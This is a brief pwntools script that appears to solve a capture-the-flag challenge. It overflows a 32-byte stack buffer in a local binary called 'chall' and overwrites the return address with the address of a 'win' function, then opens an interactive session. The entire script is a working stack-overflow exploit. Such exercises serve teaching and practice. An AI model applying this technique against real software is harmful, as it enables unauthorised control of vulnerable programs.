from pwn import *

elf = context.binary = ELF('./chall')
p = process()

# name[32] on the stack, followed by an 8-byte saved rbp, then the
# return address -> confirmed statically from vuln()'s `sub $0x20,%rsp`
# prologue (32 + 8 = 40 bytes before the return address).
offset = 40
win = elf.symbols['win']

payload = b'A' * offset + p64(win)

p.sendlineafter(b'> ', payload)
p.interactive()
